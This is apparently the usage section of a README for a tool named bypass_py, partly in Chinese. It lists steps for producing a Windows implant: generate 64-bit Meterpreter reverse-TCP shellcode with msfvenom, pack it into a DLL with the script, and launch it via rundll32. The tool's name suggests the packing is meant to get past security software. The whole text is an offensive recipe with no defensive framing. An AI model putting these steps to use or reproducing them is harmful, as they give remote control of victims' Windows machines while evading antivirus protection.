example:
1. git clone https://github.com/fengzihk/bypass_py.git && apt-get install mingw-w64*
2. cd bypass
3.msf或cs生成shellcode,需64位shellcode才可以运行
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$YOUR_IP LPORT=$YOUR_PORT -f raw > payload.bin
4. python3 bypass_py.py payload.bin
5. rundll32 xx.dll,key

#